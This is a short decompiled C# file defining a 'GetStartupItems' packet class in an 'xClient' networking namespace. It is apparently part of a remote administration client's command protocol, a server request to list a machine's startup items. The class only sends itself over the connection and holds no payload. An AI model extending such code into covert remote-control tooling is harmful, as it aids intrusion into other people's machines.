using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x02000098 RID: 152
	[Serializable]
	public class GetStartupItems : IPacket
	{
		// Token: 0x060003ED RID: 1005 RVA: 0x00003F70 File Offset: 0x00002170
		public void Execute(Client client)
		{
			client.Send<GetStartupItems>(this);
		}
	}
}
